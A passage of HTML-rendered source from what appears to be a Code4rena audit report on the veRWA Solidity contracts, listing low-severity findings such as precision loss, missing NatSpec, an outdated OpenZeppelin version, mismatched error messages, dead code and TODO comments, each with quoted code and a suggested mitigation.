</span><span class=\"mtk3\">// dblock/dt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">lastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ts</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">blockSlope</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">MULTIPLIER</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">lastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">blk</span><span class=\"mtk1\">)) / (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">lastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ts</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Go over weeks to fill history and calculate what the current point is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_floorToWeek</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastCheckpoint</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">255</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// PRECISION LOSS HERE: blockslope was originally calculated w/ a division, now it&#39;s multiplied further</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">blk</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">initialLastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">blk</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">blockSlope</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">initialLastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ts</span><span class=\"mtk1\">)) / </span><span class=\"mtk12\">MULTIPLIER</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ul>\n<li>From <code>_checkpoint_lender()</code> in LendingLedger.sol, line 60:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L60\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L60</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currEpoch</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"risk-4\" style=\"position:relative;\"><a href=\"#risk-4\" aria-label=\"risk 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<p>Precision loss in critical calculations can make the risk/reward for investors less appealing.  In critical cases there could be possible losses involved when these discrepancies are exploited.</p>\n<h3 id=\"mitigation-4\" style=\"position:relative;\"><a href=\"#mitigation-4\" aria-label=\"mitigation 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Reorder operations to ensure division happens before multiplication in the listed instances.</p>\n<h2 id=\"06-inconsistent-use-of-natspec\" style=\"position:relative;\"><a href=\"#06-inconsistent-use-of-natspec\" aria-label=\"06 inconsistent use of natspec permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] Inconsistent Use of NatSpec</h2>\n<p>NatSpec is a boon to all Solidity developers. Not only does it provide a structure for developers to document their code within the code itself, it encourages the practice of documenting code. When future developers read code documented with NatSpec, they are able to increase their capacity to understand, upgrade, and fix code. Without code documented with NatSpec, that capacity is hindered.</p>\n<p>The veRWA codebase does have a high level of documentation with NatSpec. However there are numerous instances of functions missing NatSpec.</p>\n<h3 id=\"risks\" style=\"position:relative;\"><a href=\"#risks\" aria-label=\"risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risks</h3>\n<ol>\n<li>Lack of understanding of code without adequate documentation.</li>\n<li>Difficulty in understanding, upgrading, and fixing code without documentation.</li>\n</ol>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<ol>\n<li>Practice consistent use of NatSpec on all parts of the project codebase.</li>\n<li>Include the need for NatSpec comments for code reviews to pass.</li>\n</ol>\n<h2 id=\"07-old-version-of-openzeppelin-contracts-used\" style=\"position:relative;\"><a href=\"#07-old-version-of-openzeppelin-contracts-used\" aria-label=\"07 old version of openzeppelin contracts used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] Old version of OpenZeppelin Contracts used</h2>\n<p>Using old versions of 3rd-party libraries in the build process can introduce vulnerabilities to the protocol code. </p>\n<ul>\n<li>Latest is 4.9.3 (as of July 28, 2023), version used in project is 4.9.2</li>\n</ul>\n<h3 id=\"risks-1\" style=\"position:relative;\"><a href=\"#risks-1\" aria-label=\"risks 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risks</h3>\n<ol>\n<li>Older versions of OpenZeppelin contracts might not have fixes for known security vulnerabilities.</li>\n<li>Older versions might contain features or functionality that have been deprecated in recent versions.</li>\n<li>Newer versions often come with new features, optimizations, and improvements that are not available in older versions.</li>\n</ol>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Review the latest version of the OpenZeppelin contracts and upgrade</p>\n<h2 id=\"08-error-messages-dont-match-intent\" style=\"position:relative;\"><a href=\"#08-error-messages-dont-match-intent\" aria-label=\"08 error messages dont match intent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] Error Messages don’t match intent</h2>\n<p>Meaningful error messages give better handles to test against. While building a test suite, edge cases can become numerous, and providing descriptive error messages allows not just for the project developers to write better tests, it helps developers of 3rd-party integrations and forks (other protocols, token projects, etc) to understand the intentions and reasoning of the parent project.</p>\n<p>In the veRWA codebase, there are places where the error cases are materially different from the guards they are included with. </p>\n<ul>\n<li>From <code>VotingEscrow.sol</code>, line 573:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L573\">https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L573</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blockNumber</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only past block number&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//Should be “Only before block number”</span></span></span></code></pre>\n<h3 id=\"risk-5\" style=\"position:relative;\"><a href=\"#risk-5\" aria-label=\"risk 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<ol>\n<li>Project developers get the wrong understanding of why a case is erroneous.</li>\n<li>Writing tests for specific error types becomes difficult because of a lack of unique errors provided by the executed code.</li>\n<li>3rd-party developers (forks, integrations) can have difficulties understanding developer intentions.</li>\n</ol>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Use more descriptive handler names and error messages and limit reusing error messages for categorically-similar-yet-different errors.</p>\n<h2 id=\"09-function-names-dont-match-intent\" style=\"position:relative;\"><a href=\"#09-function-names-dont-match-intent\" aria-label=\"09 function names dont match intent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] Function Names don’t match intent</h2>\n<p><code>totalSupply</code>, <code>totalSupplyAt</code>, <code>supplyAt</code> in <code>VotingEscrow.sol</code> refer to voting power, not locked supply.  This causes confusion to developers or auditors onboarding to the codebase.</p>\n<h2 id=\"10-dead-code\" style=\"position:relative;\"><a href=\"#10-dead-code\" aria-label=\"10 dead code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] Dead Code</h2>\n<p>In many cases, dead code can create attack surfaces for malicious exploits. In the case for <code>VotingEscrow.sol</code>, there are instances of dead and unused code, though the risks are much lower.</p>\n<h3 id=\"unused-assignment\" style=\"position:relative;\"><a href=\"#unused-assignment\" aria-label=\"unused assignment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unused assignment</h3>\n<ul>\n<li>From <code>_checkpoint()</code> in <code>VotingEscrow.sol</code>, line 206:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L206\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L206</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lastCheckpoint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// &lt;= this is never used</span></span></span></code></pre>\n<h3 id=\"unused-enums\" style=\"position:relative;\"><a href=\"#unused-enums\" aria-label=\"unused enums permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unused Enums</h3>\n<p>Ex. VotingEscrow.sol, line 62 and 64</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L62\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L62</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L64\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L64</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">enum</span><span class=\"mtk1\"> </span><span class=\"mtk10\">LockAction</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">INCREASE_TIME</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// &lt;= never used</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">QUIT</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// &lt;= never used</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"risk-6\" style=\"position:relative;\"><a href=\"#risk-6\" aria-label=\"risk 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<p>While no attack vectors were identified from these instances of dead code, there is a definite increase in gas usage during execution and deployment.</p>\n<h3 id=\"mitigation-5\" style=\"position:relative;\"><a href=\"#mitigation-5\" aria-label=\"mitigation 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Remove the instances of dead code from the codebase.</p>\n<h2 id=\"11-todos-included-in-codecomments\" style=\"position:relative;\"><a href=\"#11-todos-included-in-codecomments\" aria-label=\"11 todos included in codecomments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] TODOs included in code/comments</h2>\n<p>Ex. <code>LendingLedger.sol</code>, line 48 and <code>GaugeController.sol</code> line 59</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L48\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L48</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L59\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L59</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">governance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_governance</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// TODO: Maybe change to Oracle</span></span></span></code></pre>\n<h2 id=\"12-reference-to-non-existent-documentation\" style=\"position:relative;\"><a href=\"#12-reference-to-non-existent-documentation\" aria-label=\"12 reference to non existent documentation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] Reference to non-existent documentation</h2>\n<p>The references to IVotingEscrow are misleading because there is no IVotingEscrow anywhere in the codebase.  This makes it difficult to trust comments in the codebase, let alone find the referenced documentation that may enlighten the developer or auditor.</p>\n<p>Examples: </p>\n<ul>\n<li><a 